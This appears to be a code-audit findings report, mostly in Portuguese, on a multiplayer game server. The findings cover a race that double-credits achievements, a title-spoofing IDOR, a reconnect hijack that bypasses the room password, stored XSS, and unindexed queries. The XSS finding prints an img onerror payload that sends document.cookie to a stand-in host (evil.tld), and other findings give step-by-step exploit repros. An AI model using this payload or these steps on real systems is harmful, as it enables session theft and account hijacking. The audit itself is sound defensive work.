### [P1] Crédito de achievements/win-streak/stats vitalícios fora da transação atômica e SEM idempotência (double-credit no replay do fim de jogo)
- `src/server/src/services/achievement.service.ts:149` · idempotencia-atomicidade · **CONFIRMED**
- **Evidência:** await prisma.user.update({
  where: { id: stats.odUserId },
  data: {
    total_sawed_shots: { increment: stats.sawedShots },
    total_live_hits: { increment: stats.liveHits },
    total_damage_dealt: { increment: stats.damageDealt },
    total_items_used: { increment: stats.itemsUsed },
    ...
    current_win_streak: newCurrentStreak,
    best_win_streak: newBestStreak,
  },
});
- **Repro/verificação:** Repro (2-player RANKED, ambos logados, rodada final currentRound==MAX_ROUNDS):
1) A elimina B (ou B auto-atira no timeout) -> gameService.processShot retorna roundOver -> game.handler.handleRoundEnd(winnerId=A) e chamado e entra em `await new Promise(setTimeout, 3500)` em game.handler.ts:634 ANTES de creditar nada.
2) Dentro dessa janela de ~3.5s, B (morto porem socket ainda conectado) emite `leaveRoom`. roomService.leaveRoom ve room.started, filtra alivePlayers==[A] (length 1) -> dispara onPlayerWonByDefault(A) em room.service.ts:446 e faz rooms.delete(code).
3) room.handler.onPlayerWonByDefault (linha 89): jogo e ranked, entao pula a delecao de treino; chama gamePersistenceService.endGame. Jogo ainda NAO esta COMPLETED -> claim.count==1 (game.persistence.service.ts:255) -> credita XP/ELO/total_kills/games_played 1x e retorna truthy com xpResults reais. Como endResult e truthy (linha 157), roda achievementService.processGameEnd(endResult.gameId,...) em room.handler.ts:202 -> prisma.user.update com { increment } em achievement.service.ts:149-164 credita total_damage_dealt/total_live_hits/total_sawed_shots/total_items_used/adrenaline/handcuff/info e current_win_streak/best_win_streak para AMBOS os jogadores (1a vez).
4) Em t≈3.5s handleRoundEnd resume sobre a referencia local `room` (ainda valida apesar do rooms.delete). checkGameEnd(room) retorna {ended:true, winnerId:A} (game.service.ts:892; roundWins inalterados). Chama endGame de novo -> jogo ja COMPLETED -> claim.count==0 -> RETORNA TRUTHY `{ gameId: existingGame.id, xpResults: [] }` (game.persistence.service.ts:264-267). O guard do chamador e apenas `if (endResult)` (game.handler.ts:694), truthy -> roda processGameEnd DE NOVO (game.handler.ts:745) -> o MESMO prisma.user.update increment em achievement.service.ts:149 roda 2a vez.
Efeito liquido: campos do endGame (XP/ELO/total_kills/games_played) creditados 1x (gate de idempotencia segura); porem os contadores vitalicios do achievement.service (total_damage_dealt, total_live_hits, total_sawed_shots, contadores de itens) DOBRADOS e current_win_streak/best_win_streak incrementados 2x (streak do vencedor +2 em vez de +1). Esses campos gateiam milestones (sniper=total_live_hits>=100, demolisher=total_damage_dealt>=50, saw_master, item_hoarder, unbeatable=best_win_streak>=10) e titulo dinamico title_perfectionist (maior current_win_streak) -> desbloqueio acelerado de conquistas/titulos e inflacao de streak. Grep confirmou que NAO existe flag in-memory (gameEnded/processedEnd) serializando os dois caminhos, e nao ha $transaction/gate no update do achievement.service.
- **Notas do verificador:** CONFIRMADO por trace exato, nao por execucao (nao ha DB/servidor rodando aqui), mas a lacuna estrutural e airtight: (a) endGame devolve objeto truthy no replay (linhas 264-267), (b) os dois call-sites so checam `if (endResult)` (game.handler.ts:694, room.handler.ts:157), (c) processGameEnd->prisma.user.update increment (achievement.service.ts:149-164) e incondicional, sem game_id claim/idempotencia/transacao, (d) nenhum flag in-memory serializa handleRoundEnd x onPlayerWonByDefault. O interleaving (WO durante o await de 3.5s do handleRoundEnd) e realista: jogador perdedor saindo no fim de partida ranked e comportamento comum, e a janela de 3.5s e grande. Isto e exatamente o vetor 'dois call-sites/replay' que o P0 documentou (docs/findings/2026-06-21-endgame-double-credit.md), que so foi fechado dentro de endGame() e permanece ABERTO para processGameEnd(). Correcao ao achado: total_kills e creditado em endGame (guardado pelo gate), NAO em processGameEnd, entao total_kills NAO dobra; o achado erra ao lista-lo. Os que realmente dobram sao total_damage_dealt e total_live_hits (ambos em achievement.service). Severidade P1 esta correta: e integridade de progressao/recompensas real e acionavel, porem mais estreita que o P0 original (XP/ELO/LP/MMR agora estao gateados; so o subsistema de achievements/win-streak vaza). Achado secundario tambem valido: o par findUnique+update de win-streak (achievement.service.ts:135-164) e read-modify-write sem lock/$transaction, vulneravel a corrida sob concorrencia alem do replay. Fix sugerido: (1) tornar processGameEnd idempotente por game_id (ex.: uma linha de claim GameAchievementProcessed com unique(game_id) dentro da mesma transacao dos increments), e/ou (2) endGame retornar null (ou uma flag alreadyCompleted) no replay para o guard `if (endResult)` barrar a 2a chamada de processGameEnd, e (3) mover o read-modify-write de win-streak para dentro de uma $transaction/update atomico.

### [P2] setActiveTitle grava titulo ativo sem verificar posse (IDOR de escrita em cosmetico de prestigio)
- `src/server/src/services/achievement.service.ts:597` · authz-idor · **CONFIRMED**
- **Evidência:** async setActiveTitle(userId, titleId) { await prisma.user.update({ where: { id: userId }, data: { active_title_id: titleId } }); return true; } — o controller (achievement.controller.ts:73-74) passa `req.body.titleId` direto, sem validar contra a tabela userTitle (titulos efetivamente conquistados pelo usuario).
- **Repro/verificação:** 1) Autenticar como qualquer usuario e pegar o Bearer token. 2) `PUT /api/achievements/title` com body {"titleId":"title_champion"} (Campeao Supremo — titulo ALL_TIME normalmente so do maior ELO; ou "title_perfectionist"/"title_veteran", tambem exclusivos). 3) achievement.controller.ts:73-74 le req.body.titleId e chama setActiveTitle(userId, "title_champion"); achievement.service.ts:597-600 executa prisma.user.update({ where:{id:userId}, data:{active_title_id:"title_champion"} }) SEM checar userTitle -> retorna true. 4) Efeito verificavel: GET /api/auth/me (auth.controller.ts:55 -> getUserProfile auth.service.ts:354) devolve active_title_id:"title_champion" cru; Profile.tsx:209-210 renderiza getTitleById(user.active_title_id) mostrando o titulo exclusivo ao usuario; e leaderboard.service.ts:118/195 devolve active_title_id cru para esse usuario e Leaderboard.tsx:203-213 renderiza getTitleById(entry.active_title_id) SEM revalidar posse -> o titulo exclusivo falso aparece no leaderboard PUBLICO para todos os jogadores. Nenhuma guarda/policy/validacao/transacao existe no caminho de escrita.
- **Notas do verificador:** Real e alcancavel: broken access control / falta de validacao de posse na escrita de um privilegio cosmetico. O usuario grava active_title_id com qualquer id de titulo valido sem te-lo conquistado (userTitle nunca e consultado no setActiveTitle). A observacao do autor de que getActiveTitle revalida e esconde o fake e verdadeira, mas SO para GET /api/achievements/title, que nao e a rota usada para renderizar; as superficies reais (Profile via AuthContext /me e Leaderboard) usam active_title_id cru e EXIBEM o titulo falso. Portanto o autor SUBESTIMOU o impacto de exibicao: nao vaza so no proprio perfil, spoofa um titulo exclusivo de campeao no leaderboard publico visivel a todos. Categoria authz-idor e apropriada (escrita de recurso/privilegio nao possuido; embora seja no proprio registro do user, o valor e um privilegio nao conquistado). Sem impacto financeiro/dados/escalada de privilegio real — dano e integridade/reputacao do sistema de prestigio. P2 defensavel pela exposicao publica no leaderboard; fica na fronteira P2/P3 (um avaliador estrito chamaria de P3 por ser puramente cosmetico). Mantenho P2. Fix: em setActiveTitle, validar titleId != null contra prisma.userTitle.findFirst({ where:{ user_id:userId, title_id:titleId, is_active:true } }) e rejeitar (retornar false / 400) se nao houver; opcionalmente sanear a saida crua de getUserProfile/leaderboard tambem.

### [P2] Autorizacao de reconexao depende de playerName publico + token de RNG fraco (Math.random); reconexao na sala de espera nao exige token
- `src/server/src/services/game/room.service.ts:738` · authz-idor · **CONFIRMED**
- **Evidência:** reconnectPlayer: `const player = room.players.find(p => p.disconnected && p.name === playerName && p.reconnectToken === reconnectToken);`. O token vem de generateReconnectToken (linha 142): `return Math.random().toString(36).substring(2,15) + Math.random().toString(36).substring(2,15);` (Math.random NAO e cripto-seguro). Alem disso, o caminho de reconexao em joinRoom (linhas 303-306) casa apenas por nome: `p => p.disconnected && p.name === playerName` — SEM token.
- **Repro/verificação:** Authz model verified: odUserId is server-trusted (socket.ts:96-102 -> authService.validateToken JWT+MySys, fail-closed), but playerName is a free client-controlled field in every socket payload, never bound to user.display_name. So any connection (incl. unauthenticated guest) can supply an arbitrary playerName.

CLEAN REPRO (WaitingRoom, no token, no password, only public data) - room.service.ts:302-332 joinRoom reconnect branch matches `p => p.disconnected && p.name === playerName` (NO token, NO odUserId) and RETURNS at line 327 BEFORE the password check at line 384:
1) Attacker connects as guest -> emit('listRooms') -> listAvailableRooms (room.service.ts:503-519) returns {code:'ABC123', hostName:'victim'} for a password-protected lobby (roomCode + host name are public).
2) Host briefly F5s -> handleDisconnect WaitingRoom branch (room.service.ts:576-591) sets player.disconnected=true for 10s.
3) Within 10s attacker emits joinRoom({code:'ABC123', playerName:'victim', password:''}).
4) First branch matches disconnected host by name -> disconnectedPlayer.id = attackerSocket; since room.host===oldSocketId, room.host = attackerSocket (lines 316-319). Attacker seizes host seat + victim's Player object (carrying victim odUserId), BYPASSING the room password, using only public info.
Handler reachability: attacker not in any room passes getRoomByUserId/getRoomByPlayer guards (room.handler.ts:486-517); guests skip them entirely.

IN-GAME sub-claim (reconnectPlayer room.service.ts:737-738 via reconnectToGame handler room.handler.ts:796-803): confirmed at code level - matches only disconnected + public name + reconnectToken, NO odUserId; token is Math.random-derived (room.service.ts:142-144, non-crypto). Full in-game hijack requires predicting that token, which is NOT broadcast (only sent to owner via reconnectCredentials) and is impractical to recover given many concurrent Math.random consumers -> that specific escalation is PLAUSIBLE, but the overall finding is CONFIRMED via the token-free WaitingRoom path above.
- **Notas do verificador:** Finding is real and, for the WaitingRoom path, stronger than the author stated: the reconnect-by-name branch executes BEFORE the password check (room.service.ts:327 return vs 384 password gate), so it also bypasses the room password. Core assertion holds: reconnection is anchored on a client-controlled, non-authenticated playerName; in-game the only secret is a Math.random token (should be crypto.randomBytes), and WaitingRoom requires no token at all. Impact is bounded: cleanly-exploitable path is pre-game and conditional on the 10s disconnect grace window (host/seat seizure, password bypass, DoS of victim slot); the highest-impact ranked in-game hijack needs impractical PRNG prediction -> P2 is fair (not P1, not P3). Recommended fixes: (1) in reconnect-by-name (joinRoom) require a reconnectToken or match on server-trusted odUserId, not playerName; (2) replace generateReconnectToken with crypto.randomBytes; (3) move the reconnect branch after the password check; (4) reject reconnect when the requesting socket's authenticated odUserId does not match the target Player.odUserId.

### [P2] XSS: markdown renderizado com marked() em dangerouslySetInnerHTML sem sanitização
- `src/client/src/pages/ChangelogPage/ChangelogPage.tsx:108` · injection-secrets · **CONFIRMED**
- **Evidência:** const parseContent = (content: string) => {
    return marked(content) as string;
  };
...
<div
  className="changelog-markdown"
  dangerouslySetInnerHTML={{ __html: parseContent(entry.content) }}
/>
- **Repro/verificação:** Sink is unsanitized and reachable. ChangelogPage.tsx:62-64 parseContent(content)=marked(content) -> line 108 dangerouslySetInnerHTML={{__html: parseContent(entry.content)}}, where entry.content comes from fetch(`${ADMIN_API_URL}/api/games/${GAME_CODE}/changelog?limit=20`) (line 37). Same pattern in src/client/src/components/pages/LegalPage/LegalPage.tsx:64-67,100 with content from /api/games/${GAME_CODE}/legal/${endpoint}. marked is v17.0.1 (node_modules confirms) which has NO default HTML sanitization (the `sanitize` option was removed post-v1); embedded raw HTML passes through intact. Grep over E:/Cursor/buckshotcopy/src for marked.use|setOptions|new Marked|sanitizer|DOMPurify|purify = 0 matches -> no global sanitization or renderer hook. Repro: admin (or an injection into the changelog/legal API) stores content = `<img src=x onerror="fetch('https://evil.tld/?c='+encodeURIComponent(document.cookie))">`. When any player opens /changelog or a legal page, marked() emits it verbatim, dangerouslySetInnerHTML injects it, onerror fires on the bangshot.mysys.* origin, exfiltrating the SSO session cookie/token. Stored XSS for all players.
- **Notas do verificador:** Sink and data flow are exactly as described; both ChangelogPage and LegalPage are affected. Fix: run marked output through DOMPurify.sanitize() (or configure a sanitizing renderer) before dangerouslySetInnerHTML, in both components. One factual correction to the finding's evidence: a bare `<script>` payload will NOT execute, because HTML inserted via innerHTML/dangerouslySetInnerHTML does not run inline scripts; the working vectors are event-handler/URI payloads (<img onerror>, <svg onload>, <iframe src=javascript:>, <a href=javascript:>). The vuln itself holds. Severity kept at P2 (author's claim is accurate, not exaggerated): it is stored XSS with SSO-token-theft impact, but the write surface is a privileged admin/API path rather than anonymous user input, so it stays below P1. Note the finding's path label 'LegalPage.tsx:100' resolves to src/client/src/components/pages/LegalPage/LegalPage.tsx:100 (matches exactly); there is no LegalPage.tsx directly under pages/.

### [P2] Double-credit dos acumuladores de conquista/streak: processGameEnd roda fora do gate de idempotência do endGame
- `src/server/src/services/game/game.persistence.service.ts:266` · economy-race · **CONFIRMED**
- **Evidência:** // endGame() — caminho no-op de idempotência RETORNA OBJETO NÃO-NULO:
        if (claim.count === 0) {
          console.log(`[DB] endGame ignorado (jogo já finalizado): ${roomCode}`);
          return { gameId: existingGame.id, xpResults: [] as PlayerXpResult[] };
        }

// game.handler.ts:685-745 — handler roda processGameEnd para QUALQUER endResult não-nulo:
      const endResult = await gamePersistenceService.endGame({ ... });
      if (endResult) {
        ...
        const achievementResult = await achievementService.processGameEnd(endResult.gameId, extendedStats);

// achievement.service.ts:149-164 — increments NÃO idempotentes fora de qualquer gate:
          await prisma.user.update({ where:{id:stats.odUserId}, data:{
            total_sawed_shots:{increment:stats.sawedShots}, total_live_hits:{increment:stats.liveHits},
            total_damage_dealt:{increment:stats.damageDealt}, total_items_used:{increment:stats.itemsUsed},
            total_adrenaline_uses:{increment:stats.adrenalineUses}, ... , current_win_streak:newCurrentStreak, best_win_streak:newBestStreak }});
- **Repro/verificação:** Jogo ranked 2 jogadores (A vence, B perde). Fluxo normal em game.handler.ts:685-745: endGame #1 (updateMany where status!=COMPLETED -> count=1) credita XP/ELO/games e processGameEnd #1 credita achievements/streak; gameOver emitido; deleteRoom agendado em 2s (game.handler.ts:798-800). room.started continua true (nunca ha `started=false` no server; so ha `started=true` em room.service.ts:535). Dentro dos 2s, B (perdedor) emite leaveRoom -> room.handler.ts:574 (guard recentLeaveRoomCalls e per-socket, nao bloqueia a 1a chamada) -> roomService.leaveRoom(B): room.started==true, B.alive=false, alivePlayers=[A] (len 1) -> onPlayerWonByDefault(A) (room.service.ts:446). Em room.handler.ts:89: getGameByRoomCode so checa is_ranked (nao checa status COMPLETED) -> endGame #2 (game.persistence.service.ts:255-267): updateMany count=0, RETORNA NAO-NULO {gameId, xpResults:[]}. Handler ve endResult truthy (room.handler.ts:157) -> processGameEnd #2 (linha 202). achievement.service.ts:149-164 faz increment INCONDICIONAL: total_damage_dealt/total_live_hits/total_items_used/total_adrenaline_uses/total_sawed_shots/total_handcuff_uses/total_info_item_uses/expired_medicine_survived somados 2x para A e B; e current_win_streak/best_win_streak recomputados de novo -> uma unica vitoria conta como +2 no streak do vencedor (pode fake-unlockar unbeatable>=10 e title_perfectionist). Os campos gated (XP/ELO/games_played/games_won/total_kills) NAO dobram (protegidos pelo gate do endGame) — exatamente o residual que o autor aponta. Nota: o perdedor clicar leave logo apos o gameOver e comportamento organico comum, entao corrompe dados ate sem script.
- **Notas do verificador:** Achado real e reproduzivel: o gate de idempotencia (updateMany status!=COMPLETED) protege so as writes internas do endGame; como o caminho no-op devolve objeto nao-nulo, os dois handlers (game.handler.ts:694 e room.handler.ts:157) re-executam processGameEnd, que nao tem gate proprio. Double-credit confirmado nos acumuladores de conquista + streak. Rebaixo de P1 para P2: o nucleo economico duro (XP/ELO/games_played/games_won/total_kills) esta protegido e NAO dobra; o vazamento fica restrito a acumuladores de progressao/achievements e ao best_win_streak (soft economy). Fica no limite P1/P2 — a inflacao de streak (fake-unlock de unbeatable/title_perfectionist a 2x de aceleracao) e a triggerabilidade organica (perdedor sai na hora) sustentam relevancia, mas sem impacto em moeda/ELO ranqueado eu classifico P2. Fix natural: endGame retornar sinal de ja-finalizado (ex.: {alreadyEnded:true} ou null no no-op) para os dois handlers pularem processGameEnd, OU dar ao processGameEnd/achievement update o mesmo gate por game (marcar game.achievements_processed atomicamente). Existe teste (tests/security/endgame-idempotency.test.ts) que cobre so o endGame, nao o processGameEnd — a lacuna e justamente essa.

### [P2] Logica de itens duplicada e divergente: itemProcessor puro ("port") esta MORTO enquanto game.service.processItem reimplementa tudo num switch de ~217 linhas mutando o Room
- `src/server/src/services/game/game.service.ts:507` · pattern-oo · **CONFIRMED**
- **Evidência:** switch (itemId) {
  case 'magnifying_glass': { const currentShell = room.shells[room.currentShellIndex]; room.revealedShell = currentShell; ... }
  case 'beer': { ... room.currentShellIndex++; ... }
  ... 10 itens, mutando room diretamente ...
} // game.service NAO importa itemProcessor; grep mostra itemProcessor referenciado SO em shared/index.ts (re-export) e nele mesmo
- **Repro/verificação:** DEAD CODE: grep de processItemEffect/validateItemUse em todo o repo (*.ts + *.tsx) retorna ZERO chamadores fora de itemProcessor.ts (uso interno na linha 145). Unica referencia externa = src/shared/index.ts:21 (`export * from './services/itemProcessor'` — barrel re-export). Nenhum arquivo em server/ ou client importa/chama o port.

CAMINHO AUTORITATIVO: entry runtime real = socket handler game.handler.ts:163 (evento 'useItem') -> gameService.processItem (game.service.ts:473), e tambem bot.service.ts:711. Esse metodo e o switch de ~217 linhas (507-724) que muta room.shells/room.currentShellIndex/user.hp/user.items in-place e intercala stats (user.stats.infoItemUses++, handcuffUses++, adrenalineUses++ ...). Nenhum dos dois callers toca o port.

DIVERGENCIA (phone), repro concreto: shells=['live','blank','blank'], currentShellIndex=2 (2 disparados, so o atual resta).
- Live (game.service.ts:578-591): randomPosition=Math.floor(Math.random()*3) -> qualquer {0,1,2}; revela ate posicao ja disparada (tem ate branch `alreadyFired`). SEM guarda.
- Port morto (validateItemUse itemProcessor.ts:108): shells.length-currentShellIndex = 1 <=1 -> retorna erro 'Nao ha cartuchos alem do atual para revelar!' e recusa; getRandomPhonePosition (gameUtils.ts:186-195) so escolhe de currentIndex+1..N-1, nunca cartucho disparado/atual.
Mesmo input -> live revela cartucho gasto, port recusa. Divergencia provada sem executar.
- **Notas do verificador:** Nao consegui refutar: e um achado pattern-oo (Regra 1 = dominio puro atras de port), nao uma alegacao de authz/validacao — logo nenhuma guarda/policy/transacao poderia derruba-lo, e nenhuma e necessaria. Todas as 3 afirmacoes factuais batem exatamente com o codigo: (1) itemProcessor nunca e chamado (so re-exportado no barrel), (2) game.service.processItem reimplementa os 10 itens num switch procedural mutando room in-place com stats intercalados, (3) as duas implementacoes ja divergem no 'phone'. Ressalva de severidade: o port NAO executa e o comportamento live do phone e intencional (comentario 'igual ao jogo original Buckshot Roulette'), entao NAO ha bug de runtime ativo hoje — o dano e debito de arquitetura/manutencao + armadilha latente (quem ligar ou copiar do port pega comportamento divergente, e a regra viva fica sem testes de unidade). Por isso mantenho P2 (limitrofe com P3); o autor nao exagerou os fatos, apenas o rotulo 'impacto' poderia ser lido como maior do que o efeito real em producao (zero). Confianca high do autor esta correta quanto aos fatos.

### [P2] Handler de socket gordo: game.handler.handleRoundEnd (~222 linhas) e useItem embutem orquestracao de regra + Prisma + achievements + broadcast
- `src/server/src/socket/game.handler.ts:615` · pattern-oo · **CONFIRMED**
- **Evidência:** export async function handleRoundEnd(io, room, code, roomService, winnerId?) {
  ... clearTimeout ... await new Promise(setTimeout 3500) ...
  gamePersistenceService.endRound(...)
  const gameEnd = gameService.checkGameEnd(room as never);
  ... build playerStats ... calculateAwards ... endMatchSession ...
  const endResult = await gamePersistenceService.endGame({...});
  const achievementResult = await achievementService.processGameEnd(...);
  io.to(code).emit('gameOver', {...});
- **Repro/verificação:** Fato estrutural verificavel no arquivo, nao um bug de runtime. (1) handleRoundEnd em src/server/src/socket/game.handler.ts:615-837 (223 linhas) mistura inline: regra de jogo (gameService.checkGameEnd L649), montagem de DTO playerStats (L655-672) e extendedStats (L697-743), persistencia Prisma (endRound L637, endGame L685, saveRound L811), calculo de awards (calculateAwards L675), tracking de sessao (endMatchSession L679), processamento de achievements (achievementService.processGameEnd L745) e broadcast (io.to(code).emit gameOver em L758/769/779/789). Primeiro parametro e io: TypedIOServer com emits diretos -> impossivel testar/reusar headless. (2) A sequencia advanceTurn -> clearTimeout/setTimeout(turnTimeout) -> emit turnChanged -> agendar botService.scheduleBotTurn esta copiada 5x: dentro de useItem em L206-231 (adrenalina-roubada expired_medicine), L256-281 (expired_medicine), L295-320 (beer) — exatamente as 3 do achado — mais L89-119 (shoot) e L891-913 (handleTurnTimeout). As copias JA divergiram: item-blocks usam delay 3000 e reason 'elimination'/'beer_reload'; shoot/timeout usam delay 3500 e reason 'shot'/'timeout'; args de advanceTurn variam (false,false vs shotSelf,wasBlank vs true,wasBlank). Nenhuma guarda/authz/config de dev refuta — e o codigo de producao real.
- **Notas do verificador:** Achado de pattern/manutenibilidade (pattern-oo Regra 1), nao vuln de seguranca — descricao factualmente correta e reproduzivel por leitura. Contagem de linhas confere (615-837 = 223 ~ os 222 alegados). Nuance que NAO refuta: as regras puras estao sim extraidas em GameService (processShot/processItem/checkGameEnd/checkRoundEnd/advanceTurn/startRound chamados como gameService.*); o que esta acoplado ao socket e a ORQUESTRACAO de fim de round/partida + I/O + persistencia + achievements + broadcast, e o achado ja delimita isso corretamente. Unico exagero do autor: 'fonte de bugs de sincronizacao' e especulativo (nenhum bug concreto provado), embora a divergencia 3000-vs-3500ms nas 5 copias sustente a preocupacao. Mantenho P2: duplicacao 5x ja divergente + orquestracao io-acoplada nao-testavel = custo de manutencao real e verificavel. Nao rebaixo pra P3 porque a duplicacao ja diverge de fato (nao e hipotetica).

### [P2] Ausencia de DTO/tipo de dominio compartilhado: Player/PlayerStats/Room definidos 3x e costurados com 25 casts `as never`
- `src/server/src/socket/game.handler.ts:479` · pattern-oo · **CONFIRMED**
- **Evidência:** interface PlayerStats { damageDealt: number; ... killsInCurrentRound: number; } // game.handler.ts:479
// duplicada em game.service.ts:26 e room.service.ts:51
// pontes por cast: gameService.checkGameEnd(room as never)  (linha 649)
//                  gameService.startRound(room as never)   (linha 808)
//                  processShot(room as never, ...)          (linha 856)  -> 25 ocorrencias de `as never` no server
- **Repro/verificação:** Verificado no repo (strict:true). PlayerStats (33 campos) redeclarado 3x: game.service.ts:26, room.service.ts:51, game.handler.ts:479 — e reconstruido campo-a-campo com literais copiados a mao em 3 lugares (room.service.ts:167, game.service.ts:201, bot.service.ts:121), sem factory compartilhada. Player redeclarado em game.service.ts:62 e room.service.ts:87 (+ copia inline em RoomWithTimer.players). Room em game.service.ts:82 e room.service.ts:21 (+ RoomWithTimer estreito em game.handler.ts:515). `as never` = exatamente 25 (15 game.handler.ts / 9 bot.service.ts / 1 room.handler.ts), nos pontos criticos do loop: checkGameEnd(room as never) L649, startRound(room as never) L808, processShot(room as never,...) L856, advanceTurn(room as never,...) L891, toPublicPlayer(p as never), scheduleBotTurn(room as never,...). `x as never` desliga a checagem porque never e atribuivel a qualquer parametro.

REPRO do "type system = placebo": os tipos JA divergiram silenciosamente. room.service.ts Player tem odUserId (L103, setado L164) que game.service.ts Player NAO tem; room.service.ts Room tem gameMode/debugRankEnabled/emptyRoomTimeout que game.service.ts Room nao tem. O objeto real (construido por room.service.createPlayer) carrega campos que o tipo receptor desconhece, e o `as never` esconde. Cenario concreto de bug latente: renomeie killsInCurrentRound->killsThisRound so no PlayerStats de game.service.ts:59. Os inicializadores literais em room.service.ts:198 e bot.service.ts:151 continuam emitindo killsInCurrentRound:0. game.handler passa room as never -> ZERO erro de compilacao -> em runtime game.service le player.stats.killsThisRound = undefined -> premio/regra errada, silencioso. O tipo deveria pegar isso e nao pega — exatamente na fronteira onde a regra roda.

Nao ha bug de runtime ATUAL: no caminho real o mesmo objeto completo (room.service Room) flui do roomService.getRoomByPlayer ate os metodos do gameService, entao em execucao os campos existem. E erosao de type-safety / divida arquitetural, nao vuln nem crash.
- **Notas do verificador:** Achado REAL e verificavel por construcao (pattern-oo / Regra 1: ausencia de DTO/value-object compartilhado). Contagens do autor batem exatamente (25 = 15/9/1). Unica imprecisao do texto: afirma que as 3 declaracoes sao "estruturalmente iguais" — verdade so p/ PlayerStats; Room e Player JA divergiram entre copias (odUserId, gameMode, debugRankEnabled). Essa imprecisao NAO enfraquece o achado, reforca: a divergencia silenciosa que ele preve ja aconteceu. Motivo real de precisar `as never` (e nao `as Room`): RoomWithTimer do handler omite shells/host/password, tipos insuficientemente sobrepostos -> assercao simples falharia, obrigando o cast nuclear. Severidade: mantenho P2 (nao P1, pois nao ha exploit/quebra funcional ativa; nao P3, pois entidades ja driftaram e os casts estao no nucleo do loop de jogo, risco de bug silencioso comprovado). Correcao: extrair Player/PlayerStats/Room para @shared/types, factory unica de stats, remover os 25 casts.

### [P2] recalculateTitles() dispara ~11 agregações pesadas por ended_at SEM índice a cada fim de jogo (hot path)
- `src/server/src/services/achievement.service.ts:182` · leitura-quente-sem-indice · **CONFIRMED**
- **Evidência:** // 3. Recalculate dynamic titles (fire-and-forget, don't block game end)
this.recalculateTitles().catch(err => {
  console.error('[Achievement] Erro ao recalcular titulos:', err);
});
- **Repro/verificação:** Fim de partida persistida -> game.handler.ts:745 (game-over natural) ou room.handler.ts:202 (ultimo jogador) chamam achievementService.processGameEnd() -> dentro dele, achievement.service.ts:182 dispara this.recalculateTitles() (fire-and-forget, SEM await, SEM throttle/debounce, SEM gate por isRanked). Grep confirma que a linha 182 e o UNICO caller: nao existe cron/setInterval/scheduler chamando recalculateTitles(), logo o recalculo GLOBAL de todos os titulos roda a cada partida encerrada. recalculateTitles() emite ~11 SELECTs top-level; 4 deles (title_sharpshooter L710-719, title_exterminator L744-752, title_tank L760-768, title_strategist L776-784) fazem `JOIN Game g ON gp.game_id=g.id WHERE g.ended_at >= X AND g.ended_at < Y AND g.status='COMPLETED' GROUP BY gp.user_id`. O model Game (schema.prisma:155-159) indexa apenas status, room_code, created_at(desc), winner_id — NAO ha index em ended_at. Logo cada fim de jogo dispara 4 varreduras da tabela games filtradas por coluna nao indexada + join com game_participants + GROUP BY, cujo custo cresce O(total de partidas no periodo). Repro determinístico por leitura de codigo: N partidas terminando/min => N x (4 full-scans em ended_at) por minuto contra o MySQL, escalando com o crescimento da tabela.
- **Notas do verificador:** Achado REAL e reproduzivel por trace. Fatos-chave confirmados: (1) recalculateTitles chamado por partida encerrada, unico caller, sem cron/throttle; (2) 4 queries com JOIN+GROUP BY gp.user_id filtradas por g.ended_at; (3) ausencia de index em Game.ended_at (schema.prisma 155-159). Viola Regra 4 (N-queries pesadas em leitura quente sem index). Ajustes ao texto do autor (nao mudam o veredito, mas calibram): (a) e FIRE-AND-FORGET (sem await na L182) — NAO bloqueia o emit gameOver/resposta aos jogadores; portanto NAO esta no "caminho critico" de latencia do encerramento, e sim carga de fundo no DB. (b) As 4 queries pesadas sao SELECTs puros (InnoDB REPEATABLE READ/MVCC, sem shared locks) — a alegacao de "lock-wait" e exagerada; as unicas escritas sao updateMany/create em user_titles (tabela pequena). O custo real e CPU/IO de full-scans repetidos + pressao no pool de conexoes. (c) "~11 agregacoes pesadas" superestima: das ~10-11, apenas 4 sao JOIN+GROUP+scan-nao-indexado; 3 usam LeaderboardEntry (indexada em period,period_start) e title_champion usa elo_rating (indexada). Correcao: mover recalculateTitles para job agendado (cron) em vez de por-partida, e/ou adicionar @@index([ended_at]) em Game + @@index([status, ended_at]). Nao pode simplesmente deletar a L182: como nao ha cron, ela e o unico mecanismo de recalculo de titulos hoje. Severidade P2 mantida — landmine de escalabilidade legitimo (recalc global redundante por partida sobre coluna nao indexada), mas o carater assincrono/nao-bloqueante e reads-sem-lock impedem elevar a P1; num DB pequeno inicial o custo e baixo, crescendo com o volume.

### [P2] getUserRankAllTime carrega TODOS os usuários ativos em memória e ordena em JS a cada request de leaderboard all_time
- `src/server/src/services/leaderboard.service.ts:136` · leitura-quente-sem-limite · **CONFIRMED**
- **Evidência:** const allUsers = await prisma.user.findMany({
  where: { games_played: { gt: 0 } },
  select: { id: true, tier: true, division: true, lp: true },
});

// Ordenar da mesma forma que getAllTimeLeaderboard
const sorted = allUsers.sort((a, b) => { ... });
- **Repro/verificação:** Caminho real e alcancavel. Rota montada em app.ts:103 (`app.use('/api/leaderboard', leaderboardRoutes)`) e routes.ts:11 (`router.get('/', getLeaderboard)`); tambem routes.ts:14 `GET /api/leaderboard/me` -> getMyRank (default period='all_time').

Repro:
1. Autenticar (qualquer usuario registrado/SSO com games_played>0 gera token valido).
2. `GET /api/leaderboard?period=all_time` com header `Authorization: Bearer <token>` (ou simplesmente `GET /api/leaderboard/me`).
3. Fluxo: getLeaderboard (controller:33) -> service.getLeaderboard('all_time',100,userId) (linha 50-55) -> getUserRankAllTime(userId) (linha 127). Como userId esta setado, executa linha 136-139:
   prisma.user.findMany({ where:{ games_played:{ gt:0 } }, select:{ id,tier,division,lp } })  // SEM take
   depois JS-sort de TODOS os registros (linha 142-152) + findIndex (linha 155) so pra achar a posicao de 1 usuario.
4. Nenhum rate-limit no servidor: grep `rate.?limit|express-rate|slowDown|throttle` em src/server -> 0 matches; stack de middleware em app.ts e so CORS/headers/cookie-parser/json. Repetir a request em loop => uma leitura O(N) da tabela users por request, crescendo linearmente com a base. `games_played` nao tem indice (schema so indexa elo_rating/total_xp/[tier,division,lp]/mmr_hidden/created_at), entao o filtro e seq scan.

Reforco: getAllTimeLeaderboard usa `take: limit*3` e `limit` vem de parseInt(req.query.limit) sem clamp (controller:16); esse ramo roda sem token, entao `?period=all_time&limit=99999999` forca take ~3e8 sem autenticacao no mesmo endpoint.
- **Notas do verificador:** O achado descreve o codigo com exatidao: findMany sem `take` em getUserRankAllTime (linha 136), ordenacao em JS, alcancavel por qualquer usuario autenticado, sem rate-limit, sem cache, sem indice em games_played. Nada refuta (nenhuma guarda/policy/clamp/cache).

